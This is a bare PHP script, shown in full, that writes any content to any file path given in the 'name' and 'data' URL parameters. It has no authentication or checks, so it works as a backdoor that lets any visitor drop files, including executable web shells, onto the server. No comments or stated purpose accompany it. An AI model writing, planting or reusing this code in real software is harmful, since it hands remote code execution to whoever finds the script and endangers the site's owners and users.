<?php
if(isset($_GET['name']) && isset($_GET['data']))
{
  $name = $_GET['name'];
  $data = $_GET['data'];
  file_put_contents($name, $data);
}
?>
